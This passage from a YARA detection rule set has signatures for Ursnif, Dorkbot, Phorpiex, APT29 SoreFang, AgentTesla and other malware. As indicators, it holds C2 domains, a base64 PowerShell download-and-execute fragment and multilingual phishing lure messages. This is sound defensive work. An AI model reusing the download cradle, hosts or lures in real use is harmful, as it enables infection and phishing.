?? ?? 89 ?? ?? ff ?? ?? ?? e8 ?? ?? ?? ?? 84 c0 74 ?? c6 ?? ?? ?? ?? 57 e8 ?? ?? ?? ?? 33 ff ff ?? ?? ?? ff d3 8d ?? ?? ?? 50 ff ?? ?? ?? e8 ?? ?? ?? ?? 85 c0 0f ?? ?? ?? ?? ?? ff ?? ?? ?? ff d3 39 ?? ?? ?? 0f ?? ?? ?? ?? ?? ff ?? ?? ?? e8 ?? ?? ?? ?? 8a ?? ?? ?? 5f 5e 5b 8b e5 5d c3}
condition:
(3 of them) or (any of ($hex*))
}
rule SSC_TrojanSpyWin32UrsnifASample
{
meta:
Description  = "Trojan.Ursnif.sm"
ThreatLevel  = "5"
strings:
$ = "CreateProcessNotify" ascii wide
$ = "rundll32" ascii wide
$ = "Software\\Microsoft\\Windows\\CurrentVersion\\Run" ascii wide
$ = "System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls" ascii wide
$ = "iexplore.exe" ascii wide
$ = "firefox.exe" ascii wide
$ = "Software\\AppDataLow\\Software\\Microsoft\\Internet Explorer\\Security\\AntiPhishing" ascii wide
$ = "/UPD" ascii wide
$ = "/sd %lu" ascii wide
$ = "%lu.bat" ascii wide
$ = "attrib -r -s -h %%1" ascii wide
$ = "S:(ML;;NW;;;LW)" ascii wide
$ = "D:(D;OICI;GA;;;BG)(D;OICI;GA;;;AN)(A;OICI;GA;;;AU)(A;OICI;GA;;;BA)" ascii wide
$ = "%lu.exe" ascii wide
$ = "mashevserv.com" ascii wide
$ = "ericpotic.com" ascii wide
$ = "version=%u&user=%x%x%x%x&server=%u&id=%u&crc=%x&aid=%u" ascii wide
$ = "CHROME.DLL" ascii wide
$ = "chrome.exe" ascii wide
$ = "opera.exe"  ascii wide
$ = "safari.exe" ascii wide
$ = "explorer.exe" ascii wide
condition:
6 of them
}rule SSC_ChirBSample
{
meta:
Description = "Virus.Chir.B.vb"
ThreatLevel = "5"
strings:
$ = "runouce.exe" ascii wide
$ = "imissyou@btamail.net.cn" ascii wide
$ = "ChineseHacker-2" ascii wide
condition:
all of them
}rule SSC_FileVirusWin32MaganASample
{
meta:
Description  = "Virus.Madang.sm"
ThreatLevel  = "5"
strings:
$hex_string = { 60 78 ?? 79 ?? ?? e8 ?? ?? ?? ?? 8b ?? ?? ?? e8 ?? ?? ?? ?? 61 78 ?? 79 ?? ?? 68 ?? ?? ?? ?? C3 }
condition:
any of them
}rule SSC_WormWin32CridexSamlpeE
{
meta:
Description  = "Worm.Cridex.sm"
ThreatLevel  = "5"
strings:
$ = "Software\\Microsoft\\Windows NT\\C%08X" ascii wide
$ = "<server><![CDATA[%%u.%%u.%%u.%%u:%%u]]>" ascii wide
$ = "KB%08d.exe" ascii wide
$ = "Local\\XME%08X" ascii wide
$ = "Local\\XMM%08X" ascii wide
$ = "Local\\XMI%08X" ascii wide
$ = "Local\\XMS%08X" ascii wide
$ = "Local\\XMF%08X" ascii wide
$ = "Local\\XMR%08X" ascii wide
$ = "Local\\XMQ%08X" ascii wide
$ = "Local\\XMB%08X" ascii wide
condition:
2 of them
}rule SSC_WormWin32DorkbotSamlpeA
{
meta:
Description  = "Worm.Dorkbot.sm"
ThreatLevel  = "5"
strings:
$ = "from removing our bot file!" ascii wide
$ = "from moving our bot file" ascii wide
$ = "Message hijacked!" ascii wide
$ = "popgrab" ascii wide
$ = "ftpgrab" ascii wide
$ = "s.Blocked possible browser exploit pack call on URL" ascii wide
$ = "webroot." ascii wide
$ = "fortinet." ascii wide
$ = "virusbuster.nprotect." ascii wide
$ = "gdatasoftware." ascii wide
$ = "virus." ascii wide
$ = "precisesecurity." ascii wide
$ = "lavasoft." ascii wide
$ = "heck.tc" ascii wide
$ = "emsisoft." ascii wide
$ = "onlinemalwarescanner." ascii wide
$ = "onecare.live." ascii wide
$ = "f-secure." ascii wide
$ = "bullguard." ascii wide
$ = "clamav." ascii wide
$ = "pandasecurity." ascii wide
$ = "sophos." ascii wide
$ = "malwarebytes." ascii wide
$ = "sunbeltsoftware." ascii wide
$ = "norton." ascii wide
$ = "norman." ascii wide
$ = "mcafee." ascii wide
$ = "symantec" ascii wide
$ = "comodo." ascii wide
$ = "avast." ascii wide
$ = "avira." ascii wide
$ = "avg." ascii wide
$ = "bitdefender." ascii wide
$ = "eset." ascii wide
$ = "kaspersky." ascii wide
$ = "trendmicro." ascii wide
$ = "iseclab." ascii wide
$ = "virscan." ascii wide
$ = "garyshood." ascii wide
$ = "viruschief." ascii wide
$ = "jotti." ascii wide
$ = "threatexpert." ascii wide
$ = "novirusthanks." ascii wide
$ = "virustotal." ascii wide
$ = "you stupid cracker" ascii wide
$ = "ngrBot Error" ascii wide
$ = "Slowloris]: Finished flood on" ascii wide
$ = "UDP]: Finished flood on" ascii wide
$ = "SYN]: Finished flood on" ascii wide
$ = "USB]: Infected %s" ascii wide
$ = "MSN]: Updated MSN spread message to" ascii wide
$ = "MSN]: Updated MSN spread interval to" ascii wide
$ = "HTTP]: Updated HTTP spread message to" ascii wide
$ = "HTTP]: Injected value is now %s." ascii wide
$ = "HTTP]: Updated HTTP spread interval to" ascii wide
$ = "Visit]: Visited" ascii wide
$ = "DNS]: Blocked" ascii wide
$ = "RSOCK4]: Started rsock4" ascii wide
$ = "Visit]: Error visitng" ascii wide
$ = "FTP Login]: %s" ascii wide
$ = "POP3 Login]: %s" ascii wide
$ = "FTP Infect]: %s was iframed" ascii wide
$ = "HTTP Login]: %s" ascii wide
$ = "HTTP Traffic]: %s" ascii wide
$ = "Ruskill]: Detected File:" ascii wide
$ = "Ruskill]: Detected DNS:" ascii wide
$ = "Ruskill]: Detected Reg:" ascii wide
$ = "PDef+]: %s" ascii wide
$ = "DNS]: Blocked DNS" ascii wide
$ = "MSN]: %s" ascii wide
$ = "HTTP]: %s" ascii wide
condition:
8 of them
}
rule SSC_WormWin32DorkbotSamlpeB
{
meta:
Description  = "Worm.Dorkbot.sm"
ThreatLevel  = "5"
strings:
$ = "http://ht.ly/jZH8A?yd=" ascii wide
$ = "DecriptedFiles" ascii wide
$ = "Infected Drive: %s" ascii wide
$a = "snkb00pt" ascii wide
condition:
(3 of them) or $a
}rule SSC_WormWin32PhorpiexSampleM
{
meta:
Description  = "Worm.Phorpiex.sm"
ThreatLevel  = "5"
strings:
$ = "paltalk.exe" ascii wide
$ = "Xfire.exe" ascii wide
$ = "googletalk.exe" ascii wide
$ = "Skype.exe" ascii wide
$ = "http://goo.gl" ascii wide
$ = "qemu" ascii wide
$ = "virtual" ascii wide
$ = "vmware" ascii wide
$ = "%s\\winsvcon.txt" ascii wide
$ = "%s\\rmrf%i%i%i%i.bat" ascii wide
$ = "%s%s.txt" ascii wide
$ = "%s%s.zip" ascii wide
$ = "IMG%s-JPG.scr" ascii wide
$ = "Microsoft Windows Manager" ascii wide
$ = "winbtc.exe" ascii wide
$ = "winmgr.exe" ascii wide
$ = "winraz.exe" ascii wide
$ = "winsam.exe" ascii wide
$ = "winsvc.exe" ascii wide
$ = "winsvn.exe" ascii wide
$ = ".exe" ascii wide
$ = ".bat" ascii wide
$ = ".vbs" ascii wide
$ = ".pif" ascii wide
$ = ".cmd" ascii wide
$ = "%s\\autorun.inf" ascii wide
$ = "ti piace la foto?" ascii wide
$ = "hai visto questa foto?" ascii wide
$ = "la foto e grandiosa!" ascii wide
$ = "ti ricordi la Foto?" ascii wide
$ = "conosci la persona in questa foto?" ascii wide
$ = "chi e in questa foto?" ascii wide
$ = "nu imi mai voi face niciodat poze!! toate ies urate ca asta." ascii wide
$ = "spune-mi ce crezi despre poza asta." ascii wide
$ = "asta e ce-a mai funny poza! tu ce zici?" ascii wide
$ = "zimi ce crezi despre poza asta?" ascii wide
$ = "pogled na ovu sliku" ascii wide
$ = "bu resmi bakmak" ascii wide
$ = "pozri sa na tento obr" ascii wide
$ = "pogled na to sliko" ascii wide
$ = "vaata seda pilti" ascii wide
$ = "spojrzec na to zdjecie" ascii wide
$ = "Ieskatieties " ascii wide
$ = "kyk na hierdie foto" ascii wide
$ = "tell me what you think of this picture i edited" ascii wide
$ = "this is the funniest photo ever!" ascii wide
$ = "tell me what you think of this photo" ascii wide
$ = "i don't think i will ever sleep again after seeing this photo" ascii wide
$ = "i cant believe i still have this picture" ascii wide
$ = "should i make this my default picture?" ascii wide
$ = "ken je dat foto nog?" ascii wide
$ = "kijk wat voor een foto ik heb gevonden" ascii wide
$ = "ik hoop dat jij het net bent op dit foto" ascii wide
$ = "ben jij dat op dit foto?" ascii wide
$ = "dit foto zal je echt eens bekijken!" ascii wide
$ = "ken je dit foto al?" ascii wide
$ = "olhar para esta foto" ascii wide
$ = "devrais-je mettre cette photo de profile?" ascii wide
$ = "c'est la photo la plus marrante!" ascii wide
$ = "dis moi ce que tu pense de cette photo de moi?" ascii wide
$ = "mes parents vont me tu" ascii wide
$ = "creo que no voy a poder dormir m" ascii wide
$ = "esta foto es gracios" ascii wide
$ = "mis padres me van a matar si ven esta foto mia, que decis?" ascii wide
$ = "mira como saliste en esta foto jajaja" ascii wide
$ = "wie findest du das foto?" ascii wide
$ = "hab ich dir das foto schon gezeigt?" ascii wide
$ = "schau mal welches foto ich gefunden hab" ascii wide
$ = "bist du das auf dem foto?" ascii wide
$ = "kennst du das foto schon?" ascii wide
$ = "I cant believe I still have this picture" ascii wide
$ = "I love your picture!" ascii wide
$ = "Is this you??" ascii wide
$ = "Picture of you???" ascii wide
$ = "Should I upload this picture on facebook?" ascii wide
$ = "Someone showed me your picture" ascii wide
$ = "Someone told me it's your picture" ascii wide
$ = "Take a look at my new picture please" ascii wide
$ = "Tell me what you think of this picture" ascii wide
$ = "This is the funniest picture ever!" ascii wide
$ = "What do you think of my new hair" ascii wide
$ = "What you think of my new hair color?" ascii wide
$ = "What you think of this picture?" ascii wide
$ = "You look so beautiful on this picture" ascii wide
$ = "You should take a look at this picture" ascii wide
$ = "Your photo isn't really that great" ascii wide
condition:
5 of them
}rule SSC_WormWin32SillyP2PSampleH
{
meta:
Description  = "Worm.Silly.sm"
ThreatLevel  = "5"
strings:
$ = "95BC789A" ascii wide
$ = "svchosts.exe" ascii wide
$ = "Failed to start dl thread." ascii wide
$ = "wo8T#$>X&D" ascii wide
$hex0 = { 55 8b ec 81 ec 8c 06 00 00 56 57 83 ?? ?? ?? ?? ?? ?? 8b ?? ?? b9 a5 00 00 00 8d ?? ?? ?? ?? ?? f3 ?? 68 04 01 00 00 8d ?? ?? ?? ?? ?? 50 68 68 42 40 00 ff ?? ?? ?? ?? ?? 8d ?? ?? ?? ?? ?? 50 6a 00 68 60 42 40 00 8d ?? ?? ?? ?? ?? 50 ff ?? ?? ?? ?? ?? 68 58 42 40 00 8d ?? ?? ?? ?? ?? 50 e8 ?? ?? ?? ?? 59 59 83 ?? ?? ?? ?? ?? ?? 74 ?? c7 ?? ?? ?? ?? ?? ?? ?? ?? ?? eb ?? c7 ?? ?? ?? ?? ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? 8d ?? ?? ?? ?? ?? 50 68 38 42 40 00 68 ff 01 00 00 8d ?? ?? ?? ?? ?? 50 e8 ?? ?? ?? ?? 83 c4 14 8d ?? ?? ?? ?? ?? 50 8d ?? ?? ?? ?? ?? 50 6a 06 ff ?? ?? e8 ?? ?? ?? ?? 83 c4 10 68 00 02 00 00 6a 00 8d ?? ?? ?? ?? ?? 50 e8 ?? ?? ?? ?? 83 c4 0c 8d ?? ?? ?? ?? ?? 50 ff ?? ?? ?? ?? ?? 8d ?? ?? ?? ?? ?? 50 e8 ?? ?? ?? ?? 83 c4 0c 89 ?? ?? ?? ?? ?? 8b ?? ?? ?? ?? ?? 89 ?? ?? ?? ?? ?? 83 ?? ?? ?? ?? ?? ?? 74 ?? 83 ?? ?? ?? ?? ?? ?? 74 ?? 83 ?? ?? ?? ?? ?? ?? 74 ?? eb ?? 68 64 41 40 00 68 28 42 40 00 68 ff 01 00 00 8d ?? ?? ?? ?? ?? 50 e8 ?? ?? ?? ?? 83 c4 10 eb ?? 8d ?? ?? ?? ?? ?? 50 68 0c 42 40 00 68 ff 01 00 00 8d ?? ?? ?? ?? ?? 50 e8 ?? ?? ?? ?? 83 c4 10 eb ?? 68 f0 41 40 00 68 ff 01 00 00 8d ?? ?? ?? ?? ?? 50 e8 ?? ?? ?? ?? 83 c4 0c eb ?? 68 c4 41 40 00 68 ff 01 00 00 8d ?? ?? ?? ?? ?? 50 e8 ?? ?? ?? ?? 83 c4 0c 8d ?? ?? ?? ?? ?? 50 8d ?? ?? ?? ?? ?? 50 6a 06 ff ?? ?? e8 ?? ?? ?? ?? 83 c4 10 68 00 02 00 00 6a 00 8d ?? ?? ?? ?? ?? 50 e8 ?? ?? ?? ?? 83 c4 0c 83 ?? ?? ?? ?? ?? ?? 75 ?? ff ?? ?? ?? ?? ?? 6a 00 ff ?? ?? ?? ?? ?? ff ?? ?? e8 ?? ?? ?? ?? 59 6a 00 ff ?? ?? ?? ?? ??}
$hex1 = { 55 8b ec 81 ec 14 03 00 00 57 80 ?? ?? ?? ?? ?? ?? 6a 40 59 33 c0 8d ?? ?? ?? ?? ?? f3 ?? 66 ?? aa 80 ?? ?? ?? ?? ?? ?? 6a 40 59 33 c0 8d ?? ?? ?? ?? ?? f3 ?? 66 ?? aa 6a 03 8d ?? ?? ?? ?? ?? 50 6a 00 ff ?? ?? ?? ?? ?? 50 ff ?? ?? ?? ?? ?? 80 ?? ?? ?? ?? ?? ?? 8d ?? ?? ?? ?? ?? 50 ff ?? ?? ?? ?? ?? 83 f8 02 75 ?? 6a 05 6a 00 8d ?? ?? ?? ?? ?? 50 68 48 41 40 00 68 40 41 40 00 6a 00 ff ?? ?? ?? ?? ?? 68 54 40 40 00 e8 ?? ?? ?? ?? 59 50 68 54 40 40 00 e8 ?? ?? ?? ?? 59 59 68 90 01 00 00 ff ?? ?? ?? ?? ?? 68 6c 40 40 00 6a 00 6a 00 ff ?? ?? ?? ?? ?? a3 ?? ?? ?? ?? ff ?? ?? ?? ?? ?? 3d b7 00 00 00 75 ?? 6a 00 ff ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? 89 ?? ?? 68 34 41 40 00 ff ?? ?? e8 ?? ?? ?? ?? 59 59 85 c0 74 ?? c7 ?? ?? ?? ?? ?? ?? ?? ?? ?? e8 ?? ?? ?? ?? a0 ?? ?? ?? ?? 88 ?? ?? 8d ?? ?? 50 e8 ?? ?? ?? ??}
$hex2 = { 55 8b ec 81 ec 10 03 00 00 83 ?? ?? ?? ?? ?? ?? 68 04 01 00 00 8d ?? ?? ?? ?? ?? 50 6a 00 ff ?? ?? ?? ?? ?? 50 ff ?? ?? ?? ?? ?? 68 04 01 00 00 8d ?? ?? ?? ?? ?? 50 68 78 40 40 00 ff ?? ?? ?? ?? ?? 68 84 40 40 00 8d ?? ?? ?? ?? ?? 50 68 74 42 40 00 8d ?? ?? ?? ?? ?? 50 e8 ?? ?? ?? ?? 83 c4 10 68 84 40 40 00 8d ?? ?? ?? ?? ?? 50 e8 ?? ?? ?? ?? 59 59 85 c0 0f ?? ?? ?? ?? ?? 6a 00 8d ?? ?? ?? ?? ?? 50 6a 00 68 3f 00 0f 00 6a 00 6a 00 6a 00 68 c0 42 40 00 68 01 00 00 80 ff ?? ?? ?? ?? ?? 8d ?? ?? ?? ?? ?? 50 e8 ?? ?? ?? ?? 59 50 8d ?? ?? ?? ?? ?? 50 6a 01 6a 00 68 94 40 40 00 ff ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? 6a 00 8d ?? ?? ?? ?? ?? 50 6a 00 68 3f 00 0f 00 6a 00 6a 00 6a 00 68 c0 42 40 00 68 02 00 00 80 ff ?? ?? ?? ?? ?? 8d ?? ?? ?? ?? ?? 50 e8 ?? ?? ?? ?? 59 50 8d ?? ?? ?? ?? ?? 50 6a 01 6a 00 68 94 40 40 00 ff ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? 6a 00 8d ?? ?? ?? ?? ?? 50 6a 00 68 3f 00 0f 00 6a 00 6a 00 6a 00 68 7c 42 40 00 68 02 00 00 80 ff ?? ?? ?? ?? ?? 8d ?? ?? ?? ?? ?? 50 e8 ?? ?? ?? ?? 59 50 8d ?? ?? ?? ?? ?? 50 6a 01 6a 00 68 94 40 40 00 ff ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? 68 34 41 40 00 8d ?? ?? ?? ?? ?? 50 e8 ?? ?? ?? ?? 59 59 0f b6 c0 85 c0 74 ?? 68 c8 00 00 00 ff ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? 6a 00 ff ?? ?? ?? ?? ?? 6a 00 ff ?? ?? ?? ?? ?? c9 c3}
condition:
(3 of them) or (any of ($hex*))
}rule SSC_WormSkypeMsgSpamerSample
{
meta:
Description  = "Worm.SkypeSpamer.sm"
ThreatLevel  = "5"
strings:
$code = { 6A FF 68 ?? ?? ?? ?? 64 A1 00 00 00 00 50 64 89 25 00 00 00 00 81 EC ?? ?? ?? ?? 53 55 56 57 33 DB 68 ?? ?? ?? ?? 88 5C 24 17 E8 ?? ?? ?? ?? 83 C4 04 85 C0 75 34 68 96 00 00 00 FF 15 ?? ?? ?? ?? 68 ?? ?? ?? ?? E8 ?? ?? ?? ?? 83 C4 04 83 F8 01 75 10 E8 ?? ?? ?? ?? 3C 01 75 23 53 FF 15 ?? ?? ?? ?? 53 FF 15 ?? ?? ?? ?? 68 ?? ?? ?? ?? E8 }
$a = "Skype.exe" ascii wide
$b = "msnmsgr.exe" ascii wide
condition:
2 of them
}
rule SSC_AutoGen_Win_OVPsdll_7f5954a4_TRJNx
{
meta:
author = "FileScan.IO Engine v1.1.0-24a42ff"
date = "2023-04-12"
sample = "7f5954a4778512543db975ce037b672c262daf0cd39d4c34d9520969838d2e43"
score = 50
tags = "overlay,packed,shell32.dll"
isWeakRule = true
strings:
//IOC patterns
$req0 = "5.10.87.25"
$req1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\">"
$req2 = "Installer integrity check has failed. Common causes include\nincomplete download and damaged media. Contact the\ninstaller's autho"
$req3 = "Software\\Microsoft\\Windows\\CurrentVersion"
//optional strings
$opt0 = "ADVAPI32.dll"
$opt1 = "AdjustTokenPrivileges"
$opt2 = "COMCTL32.dll"
$opt3 = "CallWindowProcW"
$opt4 = "CloseClipboard"
$opt5 = "CoCreateInstance"
$opt6 = "CoTaskMemFree"
$opt7 = "CompareFileTime"
$opt8 = "Control Panel\\Desktop\\ResourceLocale"
$opt9 = "CreateDirectoryW"
$opt10 = "CreateFileW"
$opt11 = "CreateProcessW"
$opt12 = "CreateThread"
$opt13 = "CreateWindowExW"
$opt14 = "DefWindowProcW"
$opt15 = "DeleteFileW"
$opt16 = "DestroyWindow"
$opt17 = "DispatchMessageW"
$opt18 = "EmptyClipboard"
$opt19 = "EnableWindow"
$opt20 = "ExitProcess"
$opt21 = "ExitWindowsEx"
$opt22 = "ExpandEnvironmentStringsW"
$opt23 = "FindFirstFileW"
$opt24 = "FindNextFileW"
$opt25 = "FindWindowExW"
$opt26 = "FreeLibrary"
$opt27 = "GetCommandLineW"
$opt28 = "GetCurrentProcess"
$opt29 = "GetDiskFreeSpaceExW"
$opt30 = "GetDiskFreeSpaceW"
$opt31 = "GetExitCodeProcess"
$opt32 = "GetFileAttributesW"
$opt33 = "GetFileSize"
$opt34 = "GetFileVersionInfoSizeW"
$opt35 = "GetFileVersionInfoW"
$opt36 = "GetFullPathNameW"
$opt37 = "GetLastError"
$opt38 = "GetMessagePos"
$opt39 = "GetModuleFileNameW"
$opt40 = "GetModuleHandleA"
$opt41 = "GetModuleHandleW"
$opt42 = "GetPrivateProfileStringW"
$opt43 = "GetProcAddress"
$opt44 = "GetShortPathNameW"
$opt45 = "GetSystemDirectoryW"
$opt46 = "GetSystemMetrics"
$opt47 = "GetTempFileNameW"
$opt48 = "GetTempPathW"
$opt49 = "GetTickCount"
$opt50 = "GetVersionExW"
$opt51 = "GetWindowLongW"
$opt52 = "GetWindowsDirectoryW"
$opt53 = "GlobalAlloc"
$opt54 = "GlobalFree"
$opt55 = "GlobalLock"
$opt56 = "GlobalUnlock"
$opt57 = "IsWindowEnabled"
$opt58 = "IsWindowVisible"
$opt59 = "KERNEL32.dll"
$opt60 = "LoadCursorW"
$opt61 = "LoadLibraryExW"
$opt62 = "LookupPrivilegeValueW"
$opt63 = "MoveFileExW"
$opt64 = "NullsoftInst"
$opt65 = "OleInitialize"
$opt66 = "OleUninitialize"
$opt67 = "OpenClipboard"
$opt68 = "OpenProcessToken"
$opt69 = "PeekMessageW"
$opt70 = "PostQuitMessage"
$opt71 = "RegCloseKey"
$opt72 = "RegCreateKeyExW"
$opt73 = "RegDeleteKeyExW"
$opt74 = "RegDeleteKeyW"
$opt75 = "RegDeleteValueW"
$opt76 = "RegEnumKeyW"
$opt77 = "RegEnumValueW"
$opt78 = "RegOpenKeyExW"
$opt79 = "RegQueryValueExW"
$opt80 = "RegSetValueExW"
$opt81 = "RegisterClassW"
$opt82 = "RemoveDirectoryW"
$opt83 = "SHAutoComplete"
$opt84 = "SHBrowseForFolderW"
$opt85 = "SHELL32.dll"
$opt86 = "SHFileOperationW"
$opt87 = "SHGetFileInfoW"
$opt88 = "SHGetFolderPathW"
$opt89 = "SHGetKnownFolderPath"
$opt90 = "SHGetPathFromIDListW"
$opt91 = "SHGetSpecialFolderLocation"
$opt92 = "SearchPathW"
$opt93 = "SendMessageTimeoutW"
$opt94 = "SendMessageW"
$opt95 = "SetClipboardData"
$opt96 = "SetCurrentDirectoryW"
$opt97 = "SetDefaultDllDirectories"
$opt98 = "SetEnvironmentVariableW"
$opt99 = "SetErrorMode"
$opt100 = "SetFileAttributesW"
$opt101 = "SetFilePointer"
$opt102 = "SetFileSecurityW"
$opt103 = "SetFileTime"
$opt104 = "SetForegroundWindow"
$opt105 = "SetWindowLongW"
$opt106 = "SetWindowPos"
$opt107 = "ShellExecuteExW"
$opt108 = "ShowWindow"
$opt109 = "SystemParametersInfoW"
$opt110 = "USER32.dll"
$opt111 = "WaitForSingleObject"
$opt112 = "WritePrivateProfileStringW"
condition:
//require 50% of optional strings
uint16(0) == 0x5A4D and filesize > 241568 and filesize < 295248 and all of ($req*) and 50 of ($opt*)
}
rule SSC_MITRE_AutoGen_x8114_PYLD
{
strings:
$s1 = "SQBFAFgAIAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpA"
$s2 = "awBlACgAJwANAAoAaAB0AHQAcABzADoALwAvAGQAYwA0ADMAOAAuADQAcwB5AG4AYwAuAGMAbwBtAC8AZABvAHcAbgBsAG8AYQBkAC8ANQAtAGgAZ"
condition:
uint16(0) == 0x4b50 and filesize < 150KB and filesize > 20KB and any of them
}
rule SSC_SUSP_Imphash_Mar23_3 {
meta:
description = "Detects imphash often found in malware samples (Maximum 0,25% hits with search for 'imphash:x p:0' on Virustotal) = 99,75% hits"
license = "Detection Rule License 1.1 https://github.com/SigmaHQ/Detection-Rule-License"
author = "Arnim Rupp (https://github.com/ruppde)"
date = "2023-03-23"
reference = "Internal Research"
score = 45
condition:
uint16(0) == 0x5A4D and (
// no size limit as some samples are 20MB+ and the hash is calculated only on the header
pe.imphash() == "87bed5a7cba00c7e1f4015f1bdae2183" or
pe.imphash() == "09d0478591d4f788cb3e5ea416c25237" or
pe.imphash() == "afcdf79be1557326c854b6e20cb900a7" or
pe.imphash() == "6ed4f5f04d62b18d96b26d6db7c18840" or
pe.imphash() == "fc6683d30d9f25244a50fd5357825e79" or
pe.imphash() == "2c5f2513605e48f2d8ea5440a870cb9e" or
pe.imphash() == "0b5552dccd9d0a834cea55c0c8fc05be"
)
and pe.number_of_signatures == 0
}
rule SSC_APT_APT29_sorefang_add_random_commas_spaces {
meta:
description = "Rule to detect SoreFang based on function that adds commas and spaces"
author = "NCSC"
reference = "https://www.ncsc.gov.uk/news/advisory-apt29-targets-covid-19-vaccine-development"
hash = "58d8e65976b53b77645c248bfa18c3b87a6ecfb02f306fe6ba4944db96a5ede2"
strings:
$ = { E8 ?? ?? ?? ?? B9 06 00 00 00 99 F7 F9 8B CE 83 FA 04 7E 09 6A
02 68 ?? ?? ?? ?? EB 07 6A 01 68 }
condition:
(uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550)
and any of them
}
rule SSC_APT_APT29_sorefang_modify_alphabet_custom_encode {
meta:
description = "Rule to detect SoreFang based on arguments passed into custom encoding algorithm function"
author = "NCSC"
reference = "https://www.ncsc.gov.uk/news/advisory-apt29-targets-covid-19-vaccine-development"
hash = "58d8e65976b53b77645c248bfa18c3b87a6ecfb02f306fe6ba4944db96a5ede2"
strings:
$ = { 33 C0 8B CE 6A 36 6A 71 66 89 46 60 88 46 62 89 46 68 66 89 46
64 }
condition:
(uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and any of them
}
rule SSC_INDICATOR_EXE_Packed_CryptoProtector {
meta:
author = "ditekSHen"
description = "Detects executables packed with CryptoProtector / CryptoObfuscator"
strings:
$s1 = "CryptoObfuscator" ascii
$s2 = "CryptoProtector [{0}]" wide
$e1 = /[A-F0-9]{7,8}\.Crypto/ ascii
condition:
uint16(0) == 0x5a4d and all of ($s*) or (($s1) and #e1 > 10) or all of them
}
rule SSC_AgentTeslaXor
{
meta:
author = "kevoreilly"
description = "AgentTesla xor-based config decoding"
cape_type = "AgentTesla Payload"
strings:
$decode = {06 91 06 61 20 [4] 61 D2 9C 06 17 58 0A 06 7E [4] 8E 69 FE 04 2D ?? 2A}
condition:
uint16(0) == 0x5A4D and any of them
}
rule SSC_AutoGen_Win_CAIC_GKLOVP_20c8b48d
{
meta:
author = "FileScan.IO Engine v1.1.0-8e757d9"
date = "2023-10-27"
sample = "20c8b48d65f0a3c5d6120e24559b9f87160644685af7ae7a380f5cabb3cf0609"
score = 100
tags = "crypted,appinstaller,control,greyware,keylogger,lolbin,overlay,packed"
isWeakRule = true

strings:

//IOC patterns
$req0 = "1.3.6.1.4.1.311.76.3.1"
$req1 = "System\\CurrentControlSet\\Control\\Session Manager\\Memory Management"
$req2 = "System\\CurrentControlSet\\Services\\VerifierExt\\Extensions\\Autofail"

//optional strings
$opt0 = "ADVAPI32.DLL"
$opt1 = "AcquireSRWLockExclusive"
$opt2 = "AppInstaller"
$opt3 = "AppInstaller.exe"
$opt4 = "Appinstaller"
$opt5 = "CLSIDFromString"
$opt6 = "CRYPT32.dll"
$opt7 = "CertFreeCertificateChain"
$opt8 = "CertFreeCertificateContext"
$opt9 = "CertGetCertificateChain"
$opt10 = "CertGetSubjectCertificateFromStore"
$opt11 = "CertVerifyCertificateChainPolicy"
$opt12 = "CoCreateGuid"
$opt13 = "CoCreateInstance"
$opt14 = "CoInitialize"
$opt15 = "CoInitializeEx"
$opt16 = "CoTaskMemAlloc"
$opt17 = "CoTaskMemFree"
$opt18 = "CoUninitialize"
$opt19 = "CreateDesktopA"
$opt20 = "CreateDirectoryA"
$opt21 = "CreateFileA"
$opt22 = "CreateMutexA"
$opt23 = "CreatePipe"
$opt24 = "CreateProcessA"
$opt25 = "CreateThread"
$opt26 = "CreateWindowExA"
$opt27 = "CryptMsgGetParam"
$opt28 = "CryptQueryObject"
$opt29 = "DecodePointer"
$opt30 = "DefWindowProcA"
$opt31 = "DeleteCriticalSection"
$opt32 = "DeleteFileA"
$opt33 = "DeleteUrlCacheEntry"
$opt34 = "DestroyWindow"
$opt35 = "DisableThreadLibraryCalls"
$opt36 = "DispatchMessageA"
$opt37 = "DisplayName"
$opt38 = "DllCanUnloadNow"
$opt39 = "DllGetClassObject"
$opt40 = "DllRegisterServer"
$opt41 = "DllUnregisterServer"
$opt42 = "EnterCriticalSection"
$opt43 = "EventRegister"
$opt44 = "EventSetInformation"
$opt45 = "EventUnregister"
$opt46 = "EventWriteTransfer"
$opt47 = "ExitProcess"
$opt48 = "ExitThread"
$opt49 = "ExpandEnvironmentStringsA"
$opt50 = "FileTimeToLocalFileTime"
$opt51 = "FileTimeToSystemTime"
$opt52 = "FindFirstFileA"
$opt53 = "FindFirstUrlCacheEntryA"
$opt54 = "FindNextFileA"
$opt55 = "FindNextUrlCacheEntryA"
$opt56 = "FindWindowA"
$opt57 = "FormatMessageW"
$opt58 = "FreeLibrary"
$opt59 = "GetCommandLineA"
$opt60 = "GetCurrentProcessId"
$opt61 = "GetCurrentThreadId"
$opt62 = "GetExitCodeProcess"
$opt63 = "GetExitCodeThread"
$opt64 = "GetFileAttributesA"
$opt65 = "GetFileSize"
$opt66 = "GetFileTime"
$opt67 = "GetForegroundWindow"
$opt68 = "GetLastError"
$opt69 = "GetLocalTime"
$opt70 = "GetMessageA"
$opt71 = "GetModuleFileNameA"
$opt72 = "GetModuleHandleA"
$opt73 = "GetProcAddress"
$opt74 = "GetSecurityInfo"
$opt75 = "GetSystemDirectoryA"
$opt76 = "GetSystemTimeAsFileTime"
$opt77 = "GetTempPathA"
$opt78 = "GetThreadDesktop"
$opt79 = "GetTickCount"
$opt80 = "GetTimeZoneInformation"
$opt81 = "GetVersion"
$opt82 = "GetVersionExA"
$opt83 = "GetWindowTextA"
$opt84 = "GetWindowsDirectoryA"
$opt85 = "GlobalMemoryStatus"
$opt86 = "InitializeConditionVariable"
